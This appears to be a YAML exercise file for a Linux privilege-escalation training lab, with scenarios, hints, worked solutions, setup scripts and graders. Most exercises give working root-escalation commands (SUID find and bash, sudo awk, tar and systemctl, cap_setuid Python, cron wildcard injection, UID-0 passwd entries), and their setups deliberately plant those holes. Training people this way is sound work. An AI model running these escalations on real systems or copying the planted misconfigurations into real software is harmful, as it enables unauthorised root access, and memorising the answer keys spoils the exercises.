track: offsec
module: Linux privilege escalation
profile: offsec
order: 2
exercises:

- id: offsec-priv-001
  title: A find with superpowers
  difficulty: 2
  kind: build
  tags: [privesc, suid, gtfobins]
  scenario: |
    You are the unprivileged user. The root flag is in **`/root/flag.txt`**, which
    you can't read — yet.

    Someone left a **SUID-root** copy of `find` at **`/srv/kl/find`**. A SUID
    binary runs as its owner (root), and `find` can execute commands with `-exec`,
    so it will run them **as root** too.

    Use it to read the flag and write it to **`/lab/flag.txt`**.
  hints:
    - "Confirm the SUID bit: `ls -l /srv/kl/find` shows an `s` (`-rwsr-xr-x`)."
    - "`-exec` runs as root: `/srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \\;`"
  solution: |
    A SUID binary keeps its owner's privileges, and `find -exec` inherits them:

    ```bash
    /srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \; > /lab/flag.txt
    cat /lab/flag.txt
    ```

    (See GTFOBins for the catalogue of binaries that can be abused this way.)
  setup: |
    root_flag >/dev/null
    install -m 4755 -o root -g root /usr/bin/find /srv/kl/find
    on_reset 'rm -f /srv/kl/find'
  check: |
    check "cannot read the flag as the unprivileged user" \
      '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    /srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \; > /lab/flag.txt

- id: offsec-priv-002
  title: Sudo gave you one command too many
  difficulty: 3
  kind: build
  tags: [privesc, sudo, gtfobins]
  scenario: |
    Check what you're allowed to run as root with **`sudo -l`**. The admin granted
    you password-less `sudo` for a program that was never meant to be a way in —
    but it can run arbitrary commands, so it is one.

    Use that sudo right to read **`/root/flag.txt`** and write it to
    **`/lab/flag.txt`**.
  hints:
    - "`sudo -l` lists your allowed command — it's `/usr/bin/awk`."
    - "`awk` can run shell commands: `sudo awk 'BEGIN{system(\"cat /root/flag.txt\")}'`"
  solution: |
    `awk`'s `system()` runs a shell command, and `sudo` runs `awk` as root:

    ```bash
    sudo awk 'BEGIN{system("cat /root/flag.txt")}' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/awk\n' "$U" > /etc/sudoers.d/kl-awk
    chmod 440 /etc/sudoers.d/kl-awk
    on_reset 'rm -f /etc/sudoers.d/kl-awk'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    sudo awk 'BEGIN{system("cat /root/flag.txt")}' > /lab/flag.txt

- id: offsec-priv-003
  title: The docker group is root
  difficulty: 3
  kind: build
  tags: [privesc, docker, group]
  scenario: |
    Run `id` — you're in the **`docker`** group. Anyone who can talk to the Docker
    daemon can start a container that **mounts the host's filesystem** and reads
    anything on it as root. Membership in `docker` is effectively root.

    Mount the host's `/root` into a container and read **`/root/flag.txt`**. Write
    it to **`/lab/flag.txt`**.
  hints:
    - "Bind-mount the host directory into a throwaway container: `docker run --rm -v /root:/r alpine cat /r/flag.txt` — but use a pre-pulled image."
    - "`docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt`"
  solution: |
    ```bash
    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
    ```

    The container runs as root and the bind mount exposes the host's files, so the
    `docker` group is a direct path to root.
  setup: |
    root_flag >/dev/null
    # The offsec VM already puts the lab user in the docker group; make sure.
    usermod -aG docker "$(lab_user)" 2>/dev/null || true
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt

- id: offsec-priv-004
  title: A capability you can abuse
  difficulty: 3
  kind: build
  tags: [privesc, capabilities]
  scenario: |
    Modern Linux splits root's power into **capabilities**. A copy of Python at
    **`/srv/kl/python3`** has been given **`cap_setuid`**, which lets it change its
    own UID to 0 — becoming root without being SUID.

    List file capabilities with `getcap`, then use that Python to set your UID to
    0 and read **`/root/flag.txt`** into **`/lab/flag.txt`**.
  hints:
    - "`getcap /srv/kl/python3` shows `cap_setuid=ep`. In Python, `os.setuid(0)` then read the file and print it."
    - "Print to stdout and let your shell save it: `/srv/kl/python3 -c 'import os;os.setuid(0);print(open(\"/root/flag.txt\").read(),end=\"\")' > /lab/flag.txt`"
  solution: |
    ```bash
    /srv/kl/python3 -c 'import os; os.setuid(0); \
      print(open("/root/flag.txt").read(), end="")' > /lab/flag.txt
    ```

    `cap_setuid` lets the process call `setuid(0)` and read root-owned files — but
    note it only grants *that* capability, not `CAP_DAC_OVERRIDE`, so the process
    still can't write into directories it doesn't own. Printing the flag and
    letting your own shell redirect it into `/lab` sidesteps that.
  setup: |
    root_flag >/dev/null
    cp /usr/bin/python3 /srv/kl/python3
    setcap cap_setuid+ep /srv/kl/python3
    on_reset 'rm -f /srv/kl/python3'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "python3 copy carries cap_setuid" 'getcap /srv/kl/python3 | grep -q cap_setuid'
    check_flag
  solve: |
    /srv/kl/python3 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read(), end="")' > /lab/flag.txt

- id: offsec-priv-005
  title: The cron job you can rewrite
  difficulty: 4
  kind: build
  tags: [privesc, cron, writable]
  scenario: |
    Root runs a scheduled job every minute: look in **`/etc/cron.d/`**. The script
    it runs, **`/srv/kl/collect.sh`**, is **world-writable** — so whatever you put
    in it runs as **root** on the next tick.

    Make the job copy **`/root/flag.txt`** somewhere you can read it (e.g.
    `/lab/flag.txt`), then wait for it to run. This may take up to a minute.
  hints:
    - "`cat /etc/cron.d/*` shows the job runs `/srv/kl/collect.sh` as root. `ls -l /srv/kl/collect.sh` — it's writable by you."
    - "Overwrite it: `printf '#!/bin/bash\\ncp /root/flag.txt /lab/flag.txt; chmod 644 /lab/flag.txt\\n' > /srv/kl/collect.sh`, then wait for the next minute."
  solution: |
    ```bash
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    cp /root/flag.txt /lab/flag.txt
    chmod 644 /lab/flag.txt
    EOF
    # wait for root's cron to run it (up to ~60s)
    while [ ! -f /lab/flag.txt ]; do sleep 2; done
    cat /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    mkdir -p /srv/kl
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    # placeholder — root runs this every minute
    :
    EOF
    chmod 0777 /srv/kl/collect.sh
    printf '* * * * * root /srv/kl/collect.sh\n' > /etc/cron.d/kl-harvest
    chmod 0644 /etc/cron.d/kl-harvest
    on_reset 'rm -f /etc/cron.d/kl-harvest /srv/kl/collect.sh'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    cp /root/flag.txt /lab/flag.txt
    chmod 644 /lab/flag.txt
    EOF
    for i in $(seq 1 45); do [ -f /lab/flag.txt ] && break; sleep 2; done

- id: offsec-priv-006
  title: Crack the root password
  difficulty: 4
  kind: build
  tags: [privesc, creds, hashcracking, john]
  scenario: |
    A careless backup left readable copies of the password database at
    **`/srv/kl/passwd.bak`** and **`/srv/kl/shadow.bak`**. The root account's
    password is weak — crack it.

    Use **John the Ripper** with the wordlist **`/usr/share/kl/wordlists/top.txt`**
    to recover root's password, and write the plaintext password (just the word)
    to **`/lab/flag.txt`**.
  hints:
    - "Combine the two files for John: `unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u`."
    - "`john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u` then `john --show /tmp/u` — the password is in the output."
  solution: |
    ```bash
    unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u
    john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u
    john --show /tmp/u          # root:<password>:...
    john --show /tmp/u | awk -F: '/^root:/{print $2}' > /lab/flag.txt
    ```
  setup: |
    PW=hunter2
    echo "$PW" > "$KL_STATE/answer"
    HASH=$(openssl passwd -6 "$PW")
    cp /etc/passwd /srv/kl/passwd.bak; chmod 644 /srv/kl/passwd.bak
    cp /etc/shadow /srv/kl/shadow.bak
    # give root the weak password in the readable backup only (not the live system)
    awk -v h="$HASH" -F: 'BEGIN{OFS=":"} $1=="root"{$2=h} {print}' /etc/shadow > /srv/kl/shadow.bak
    chmod 644 /srv/kl/shadow.bak
    on_reset 'rm -f /srv/kl/passwd.bak /srv/kl/shadow.bak'
  check: |
    check "backup hashes are readable" 'sudo -u "$(lab_user)" test -r /srv/kl/shadow.bak'
    check_flag
  solve: |
    rm -f "$HOME/.john/john.pot" 2>/dev/null || true
    unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u
    john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u >/dev/null 2>&1
    john --show /tmp/u 2>/dev/null | awk -F: '/^root:/{print $2}' | head -1 > /lab/flag.txt

- id: offsec-priv-007
  title: Hijack the PATH of a SUID binary
  difficulty: 4
  kind: build
  tags: [privesc, suid, path]
  scenario: |
    **`/srv/kl/report`** is a SUID-root program. It runs a system command by its
    **bare name** (`id`), without an absolute path — so it trusts your `PATH` to
    find it. Put your own `id` earlier in `PATH` and the SUID program runs *your*
    code as root.

    Make it run a command that reads **`/root/flag.txt`**, and write the flag to
    **`/lab/flag.txt`**.
  hints:
    - "Create a fake `id` in a writable dir: it should copy/print the flag. Make it executable and put its dir first in `PATH`, then run `/srv/kl/report`."
    - "`printf '#!/bin/bash\\ncat /root/flag.txt\\n' > /tmp/id; chmod +x /tmp/id; PATH=/tmp:$PATH /srv/kl/report > /lab/flag.txt`"
  solution: |
    ```bash
    printf '#!/bin/bash\ncat /root/flag.txt\n' > /tmp/id
    chmod +x /tmp/id
    PATH=/tmp:$PATH /srv/kl/report > /lab/flag.txt
    ```

    The SUID `report` calls `system("id")`; with `/tmp` first in `PATH` it runs
    `/tmp/id` as root. Always call programs by absolute path in privileged code.
  setup: |
    root_flag >/dev/null
    cat > /srv/kl/report.c <<'EOF'
    #include <stdlib.h>
    int main(void){ setuid(0); setgid(0); system("id"); return 0; }
    EOF
    gcc -O2 -o /srv/kl/report /srv/kl/report.c
    chown root:root /srv/kl/report; chmod 4755 /srv/kl/report   # chmod last: chown clears the SUID bit
    rm -f /srv/kl/report.c
    on_reset 'rm -f /srv/kl/report'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "/srv/kl/report is SUID root" '[ -u /srv/kl/report ]'
    check_flag
  solve: |
    printf '#!/bin/bash\ncat /root/flag.txt\n' > /tmp/id
    chmod +x /tmp/id
    PATH=/tmp:$PATH /srv/kl/report > /lab/flag.txt

- id: offsec-priv-008
  title: Hijack the imported module
  difficulty: 4
  kind: build
  tags: [privesc, sudo, python]
  scenario: |
    `sudo -l` shows you can run a reporting tool as root with NOPASSWD:
    **`/usr/bin/python3 /opt/kl/report.py`**. That script does
    `import klhelper` — and it loads `klhelper` from **`/srv/kl/lib`**, a directory
    **you can write to**. Python imports run the module's code, so if you replace
    `klhelper.py`, *your* code runs as root.

    Overwrite the module so it reads **`/root/flag.txt`** into **`/lab/flag.txt`**,
    then trigger the script with sudo.
  hints:
    - "`ls -ld /srv/kl/lib` — it's writable. Rewrite `/srv/kl/lib/klhelper.py` so its `main()` copies the flag, then run the sudo command."
    - "Put the copy in `main()`: `open('/lab/flag.txt','w').write(open('/root/flag.txt').read())`, then `sudo /usr/bin/python3 /opt/kl/report.py`."
  solution: |
    The script trusts a module directory you control, so replace the module:

    ```bash
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        data = open("/root/flag.txt").read()
        open("/lab/flag.txt", "w").write(data)
        import os; os.chmod("/lab/flag.txt", 0o644)
    EOF
    sudo /usr/bin/python3 /opt/kl/report.py
    ```

    `import` executing code from a writable path is a classic privilege-escalation
    sink; privileged scripts must import only from trusted, non-writable locations.
  setup: |
    root_flag >/dev/null
    install -d -m 755 /opt/kl
    cat > /opt/kl/report.py <<'EOF'
    import sys
    sys.path.insert(0, "/srv/kl/lib")   # VULNERABLE: a writable dir on the import path
    import klhelper
    klhelper.main()
    EOF
    chmod 644 /opt/kl/report.py
    install -d -m 777 /srv/kl/lib
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        print("daily report: ok")
    EOF
    chmod 666 /srv/kl/lib/klhelper.py
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/python3 /opt/kl/report.py\n' "$U" > /etc/sudoers.d/kl-report
    chmod 440 /etc/sudoers.d/kl-report
    on_reset 'rm -rf /opt/kl /srv/kl/lib; rm -f /etc/sudoers.d/kl-report'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "the import directory is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/lib'
    check_flag
  solve: |
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        data = open("/root/flag.txt").read()
        open("/lab/flag.txt", "w").write(data)
        import os; os.chmod("/lab/flag.txt", 0o644)
    EOF
    sudo /usr/bin/python3 /opt/kl/report.py

- id: offsec-priv-009
  title: Sudo tar breaks out
  difficulty: 4
  kind: build
  tags: [privesc, sudo, gtfobins, tar]
  scenario: |
    `sudo -l` shows password-less `sudo` for **`/usr/bin/tar`**. `tar` has a
    `--checkpoint` feature that can run a command at each checkpoint
    (`--checkpoint-action=exec=...`), and under `sudo` that command runs as root.

    Use it to read **`/root/flag.txt`** into **`/lab/flag.txt`**.
  hints:
    - "`tar` can execute a command: `--checkpoint=1 --checkpoint-action=exec=<cmd>`."
    - "`sudo tar -cf /dev/null /etc/hostname --checkpoint=1 --checkpoint-action=exec='cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'`"
  solution: |
    ```bash
    sudo tar -cf /dev/null /etc/hostname \
      --checkpoint=1 \
      --checkpoint-action=exec='sh -c "cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt"'
    ```
  setup: |
    root_flag >/dev/null
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/tar\n' "$U" > /etc/sudoers.d/kl-tar
    chmod 440 /etc/sudoers.d/kl-tar
    on_reset 'rm -f /etc/sudoers.d/kl-tar'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    sudo tar -cf /dev/null /etc/hostname \
      --checkpoint=1 \
      --checkpoint-action=exec='sh -c "cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt"'

- id: offsec-priv-010
  title: The world-writable passwd file
  difficulty: 4
  kind: build
  tags: [privesc, passwd, writable]
  scenario: |
    Check the permissions on **`/etc/passwd`** (`ls -l /etc/passwd`). It is
    **writable by everyone** — a catastrophic misconfiguration. You can add a brand
    new account with **UID 0** (root) and a password you choose, then switch to it.

    Add a root-equivalent user, become root, and read **`/root/flag.txt`** into
    **`/lab/flag.txt`**.
  hints:
    - "Generate a hash with `openssl passwd -1 pass123`, then append `hacker:<hash>:0:0:root:/root:/bin/bash` to `/etc/passwd`."
    - "Switch user non-interactively with a pty, e.g. `python3 -c 'import pty;pty.spawn([\"su\",\"hacker\"])'` and type the password, or script it."
  solution: |
    ```bash
    HASH=$(openssl passwd -1 pass123)
    echo "hacker:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
    # become the new UID-0 user and grab the flag
    echo pass123 | su - hacker -c 'cat /root/flag.txt' > /lab/flag.txt
    ```

    An extra UID-0 entry is a full root account; writable `/etc/passwd` hands it to
    anyone.
  setup: |
    root_flag >/dev/null
    cp -a /etc/passwd /etc/passwd
    chmod 666 /etc/passwd
    # state.sh restores /etc/passwd (perms + contents) on reset.
  check: |
    check "/etc/passwd is world-writable" '[ -w /etc/passwd ] && sudo -u "$(lab_user)" test -w /etc/passwd'
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    HASH=$(openssl passwd -1 pass123)
    echo "hacker:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
    echo pass123 | su - hacker -c 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-011
  title: Read any file with a capability
  difficulty: 4
  kind: build
  tags: [privesc, capabilities, dac-read]
  scenario: |
    A copy of `tar` at **`/srv/kl/tar`** carries the capability
    **`cap_dac_read_search`**, which lets it **bypass file read permissions** — it
    can read any file on the system, including **`/root/flag.txt`**, without being
    root.

    Use it to extract the flag and write it to **`/lab/flag.txt`**.
  hints:
    - "`getcap /srv/kl/tar` → `cap_dac_read_search=ep`. Use tar to archive the file, then read it from the archive."
    - "`/srv/kl/tar cf /tmp/f.tar /root/flag.txt && tar xf /tmp/f.tar -O root/flag.txt > /lab/flag.txt` (or `-C /tmp` then read)."
  solution: |
    ```bash
    /srv/kl/tar cf /tmp/f.tar -P /root/flag.txt
    tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/flag.txt
    ```

    `cap_dac_read_search` bypasses read checks, so tar can pull a root-only file
    into an archive you then read.
  setup: |
    root_flag >/dev/null
    cp /usr/bin/tar /srv/kl/tar
    setcap cap_dac_read_search+ep /srv/kl/tar
    on_reset 'rm -f /srv/kl/tar'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "/srv/kl/tar carries cap_dac_read_search" 'getcap /srv/kl/tar | grep -q cap_dac_read_search'
    check_flag
  solve: |
    /srv/kl/tar cf /tmp/f.tar -P /root/flag.txt
    tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/flag.txt

- id: offsec-priv-012
  title: The key left lying around
  difficulty: 3
  kind: build
  tags: [privesc, ssh, keys]
  scenario: |
    Root can SSH into this box, and a copy of root's **private SSH key** was left
    world-readable at **`/srv/kl/id_root`**. A private key is a credential — with
    it you can log in as root over SSH, no password needed.

    SSH in as root using that key and read **`/root/flag.txt`** into
    **`/lab/flag.txt`**.
  hints:
    - "Fix the key's permissions first (`chmod 600`), then `ssh -i <key> -o StrictHostKeyChecking=no root@127.0.0.1`."
    - "`cp /srv/kl/id_root /tmp/k; chmod 600 /tmp/k; ssh -i /tmp/k -o StrictHostKeyChecking=no root@127.0.0.1 cat /root/flag.txt > /lab/flag.txt`"
  solution: |
    ```bash
    cp /srv/kl/id_root /tmp/k && chmod 600 /tmp/k
    ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      root@127.0.0.1 'cat /root/flag.txt' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    install -d -m 700 /root/.ssh
    if [ ! -f /root/.ssh/id_ed25519 ]; then
      ssh-keygen -q -t ed25519 -N "" -f /root/.ssh/id_ed25519
    fi
    grep -qF "$(cat /root/.ssh/id_ed25519.pub)" /root/.ssh/authorized_keys 2>/dev/null \
      || cat /root/.ssh/id_ed25519.pub >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    cp /root/.ssh/id_ed25519 /srv/kl/id_root; chmod 644 /srv/kl/id_root
    on_reset 'rm -f /srv/kl/id_root'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "root private key is readable" 'sudo -u "$(lab_user)" test -r /srv/kl/id_root'
    check_flag
  solve: |
    cp /srv/kl/id_root /tmp/k && chmod 600 /tmp/k
    ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      root@127.0.0.1 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-013
  title: Sudo can restart a service you own
  difficulty: 4
  kind: build
  tags: [privesc, sudo, systemd]
  scenario: |
    `sudo -l` lets you run **`/usr/bin/systemctl`** as root (NOPASSWD). systemd
    units are just files that say what command to run as root — and you can point
    a unit at your own command, then start it with your sudo right.

    A writable unit file is at **`/srv/kl/pwn.service`**. Make it read
    **`/root/flag.txt`**, install and start it with sudo, and write the flag to
    **`/lab/flag.txt`**.
  hints:
    - "Edit `ExecStart=` to copy the flag: `/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'`."
    - "`sudo systemctl link /srv/kl/pwn.service && sudo systemctl start pwn` (Type=oneshot)."
  solution: |
    ```bash
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=pwn
    [Service]
    Type=oneshot
    ExecStart=/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'
    EOF
    sudo systemctl link /srv/kl/pwn.service
    sudo systemctl start pwn
    ```
  setup: |
    root_flag >/dev/null
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/systemctl\n' "$U" > /etc/sudoers.d/kl-systemctl
    chmod 440 /etc/sudoers.d/kl-systemctl
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=placeholder
    [Service]
    Type=oneshot
    ExecStart=/bin/true
    EOF
    chmod 666 /srv/kl/pwn.service
    on_reset 'rm -f /etc/sudoers.d/kl-systemctl /etc/systemd/system/pwn.service; systemctl daemon-reload 2>/dev/null || true'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=pwn
    [Service]
    Type=oneshot
    ExecStart=/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'
    EOF
    sudo systemctl link /srv/kl/pwn.service
    sudo systemctl start pwn
    for i in $(seq 1 10); do [ -s /lab/flag.txt ] && break; sleep 1; done

- id: offsec-priv-014
  title: The wildcard in root's backup
  difficulty: 5
  kind: build
  tags: [privesc, cron, wildcard, tar]
  scenario: |
    Every minute, root runs a backup in **`/srv/kl/share`**:
    `tar czf backup.tar.gz *`. The `*` expands to the filenames in that directory —
    and you can **write files there**. `tar` treats filenames that look like
    options (`--checkpoint-action=...`) as options, so a well-named file becomes a
    command tar runs **as root**. This is the classic *wildcard injection*.

    Plant the right filenames so the backup reads **`/root/flag.txt`** into
    **`/lab/flag.txt`**, then wait for the next run (up to a minute).
  hints:
    - "Create a payload script, then create empty files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh` in the backup dir."
    - "`cd /srv/kl/share; echo 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt' > p.sh; touch -- '--checkpoint=1' '--checkpoint-action=exec=sh p.sh'`"
  solution: |
    ```bash
    cd /srv/kl/share
    echo 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt' > p.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh p.sh'
    # wait for root's cron backup to run tar with these as arguments
    while [ ! -s /lab/flag.txt ]; do sleep 2; done
    ```
  setup: |
    root_flag >/dev/null
    install -d -m 1777 /srv/kl/share
    cat > /srv/kl/backup.sh <<'EOF'
    #!/bin/bash
    cd /srv/kl/share || exit 0
    tar czf /srv/kl/backup.tar.gz *
    EOF
    chmod 755 /srv/kl/backup.sh
    printf '* * * * * root /srv/kl/backup.sh\n' > /etc/cron.d/kl-backup
    chmod 0644 /etc/cron.d/kl-backup
    on_reset 'rm -f /etc/cron.d/kl-backup; rm -rf /srv/kl/share /srv/kl/backup.sh /srv/kl/backup.tar.gz'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "backup dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/share'
    check_flag
  solve: |
    cd /srv/kl/share
    echo 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt' > p.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh p.sh'
    for i in $(seq 1 45); do [ -s /lab/flag.txt ] && break; sleep 2; done

- id: offsec-priv-015
  title: The writable directory on root's PATH
  difficulty: 4
  kind: build
  tags: [privesc, cron, path]
  scenario: |
    Root's cron job runs **every minute** and calls a program by **bare name**
    (`backupdb`), with **`/srv/kl/bin`** early on its `PATH` — and that directory is
    **writable by you**. Drop a `backupdb` there and root runs it.

    Make root's job read **`/root/flag.txt`** into **`/lab/flag.txt`**.
  hints:
    - "`cat /etc/cron.d/*` shows `PATH=/srv/kl/bin:...` and the job runs `backupdb`. Put your own `backupdb` in `/srv/kl/bin`."
    - "`printf '#!/bin/bash\\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\\n' > /srv/kl/bin/backupdb; chmod +x /srv/kl/bin/backupdb`"
  solution: |
    ```bash
    cat > /srv/kl/bin/backupdb <<'EOF'
    #!/bin/bash
    cat /root/flag.txt > /lab/flag.txt
    chmod 644 /lab/flag.txt
    EOF
    chmod +x /srv/kl/bin/backupdb
    while [ ! -s /lab/flag.txt ]; do sleep 2; done
    ```
  setup: |
    root_flag >/dev/null
    install -d -m 777 /srv/kl/bin
    printf 'PATH=/srv/kl/bin:/usr/bin:/bin\n* * * * * root backupdb\n' > /etc/cron.d/kl-backupdb
    chmod 0644 /etc/cron.d/kl-backupdb
    on_reset 'rm -f /etc/cron.d/kl-backupdb; rm -rf /srv/kl/bin'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "PATH dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/bin'
    check_flag
  solve: |
    cat > /srv/kl/bin/backupdb <<'EOF'
    #!/bin/bash
    cat /root/flag.txt > /lab/flag.txt
    chmod 644 /lab/flag.txt
    EOF
    chmod +x /srv/kl/bin/backupdb
    for i in $(seq 1 45); do [ -s /lab/flag.txt ] && break; sleep 2; done

- id: offsec-priv-016
  title: Enumerate your way in
  difficulty: 3
  kind: build
  tags: [privesc, enumeration]
  scenario: |
    No hint about the vector this time — this is what real privilege escalation
    feels like. **Enumerate** the system to find the one weakness, exploit it, and
    read **`/root/flag.txt`** into **`/lab/flag.txt`**.

    Good things to check: `sudo -l`, SUID binaries
    (`find / -perm -4000 -type f 2>/dev/null`), file capabilities
    (`getcap -r / 2>/dev/null`), writable files in `/etc`, and cron. Exactly one of
    them is the way in.
  hints:
    - "Sweep for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`. One of them is an unusual binary under `/opt`."
    - "`/opt/backup/bash` is a SUID copy of bash — run `/opt/backup/bash -p` for a root shell, then read the flag."
  solution: |
    Enumeration finds a SUID `bash` at `/opt/backup/bash`. `bash -p` keeps the
    elevated privileges:

    ```bash
    find / -perm -4000 -type f 2>/dev/null        # ... /opt/backup/bash
    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    install -d -m 755 /opt/backup
    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
    on_reset 'rm -rf /opt/backup'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-017
  title: Take away the SUID bit
  difficulty: 3
  kind: fix
  tags: [privesc, suid, remediation, hardening]
  scenario: |
    A previous exercise left a dangerous **SUID-root `bash`** at
    **`/opt/backup/bash`** — any user can get a root shell from it. You're the
    administrator now: **remove the privilege-escalation risk**.

    The binary may legitimately need to exist, but it must **not** be SUID any
    more. Make sure no file under **`/opt/backup`** has the SUID bit set.
  hints:
    - "Find SUID files: `find /opt/backup -perm -4000`. Remove the bit with `chmod u-s`."
    - "`sudo chmod u-s /opt/backup/bash` (you have sudo for chmod here), or ask an admin — the point is the SUID bit must be gone."
  solution: |
    ```bash
    sudo chmod u-s /opt/backup/bash
    find /opt/backup -perm -4000      # (no output = fixed)
    ```
  setup: |
    echo ok > "$KL_STATE/answer"
    install -d -m 755 /opt/backup
    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/chmod\n' "$U" > /etc/sudoers.d/kl-chmod
    chmod 440 /etc/sudoers.d/kl-chmod
    on_reset 'rm -rf /opt/backup; rm -f /etc/sudoers.d/kl-chmod'
  check: |
    n=$(find /opt/backup -perm -4000 -type f 2>/dev/null | wc -l)
    check_eq "no SUID files remain under /opt/backup" "$n" "0"
  solve: |
    sudo chmod u-s /opt/backup/bash

- id: offsec-priv-018
  title: Fix the sudo rule
  difficulty: 3
  kind: fix
  tags: [privesc, sudo, remediation, hardening]
  scenario: |
    The file **`/lab/kl-sudoers`** is a sudoers drop-in that grants the `labs`
    group password-less root for **`/usr/bin/vi`** — and `vi` can spawn a shell, so
    this is a full root grant. Rewrite it to something safe.

    Keep a legitimate, **harmless** capability (let the group run **`/usr/bin/id`**
    as root — `id` can't be used to escalate), but remove the dangerous `vi` rule.
    The grader validates `/lab/kl-sudoers` with `visudo -c` and checks `vi` is gone
    and a safe rule remains.
  hints:
    - "`vi`/`vim`/editors and pagers are GTFOBins — never grant them via sudo. Replace the line with one for `/usr/bin/id`."
    - "The file must pass `visudo -cf /lab/kl-sudoers`, contain no `vi`, and still have a `NOPASSWD` rule for `/usr/bin/id`."
  solution: |
    Replace the editor grant with a harmless command:

    ```
    %labs ALL=(root) NOPASSWD: /usr/bin/id
    ```

    Validate: `visudo -cf /lab/kl-sudoers` → *parsed OK*.
  setup: |
    echo ok > "$KL_STATE/answer"
    lab_file /lab/kl-sudoers <<'EOF'
    %labs ALL=(root) NOPASSWD: /usr/bin/vi
    EOF
  check: |
    check "sudoers file is syntactically valid" 'visudo -cf /lab/kl-sudoers'
    check_not "the dangerous /usr/bin/vi rule is gone" 'grep -qE "/usr/bin/vi( |$|m)" /lab/kl-sudoers'
